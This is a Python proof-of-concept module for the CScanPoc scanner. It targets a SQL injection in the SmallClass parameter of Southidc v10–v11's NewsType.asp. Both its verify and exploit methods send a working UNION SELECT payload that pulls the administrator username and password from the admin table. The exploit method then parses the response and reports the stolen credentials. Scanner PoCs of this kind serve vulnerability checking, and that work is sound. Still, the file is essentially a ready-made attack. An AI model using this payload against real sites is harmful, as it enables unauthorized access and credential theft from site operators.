# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'source_0001_p_bb2' # 平台漏洞编号，留空
    name = 'Southidc南方数据 v11.0 /NewsType.asp SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-06-17'  # 漏洞公布时间
    desc = '''
        southidc v10.0到v11.0版本中NewsType.asp文件对SmallClass参数没有适当过滤，导致SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Southidc南方数据 v11.0 /NewsType.asp SQL注入漏洞' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'southidc'  # 漏洞应用名称
    product_version = '11.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd37e5ec6-018f-4ab2-89cb-20fb4433a12c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            exp = ("/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword"
               ",2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201"
               "=2%20and%20''='")
            
            verify_url = '{target}'.format(target=self.target)+exp
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)',re.I|re.S)
            match = pattern.match(content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            exp = ("/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword"
               ",2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201"
               "=2%20and%20''='")
            
            verify_url = '{target}'.format(target=self.target)+exp
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)',re.I|re.S)
            match = pattern.match(content)
            if match:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,username=username,password=password))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()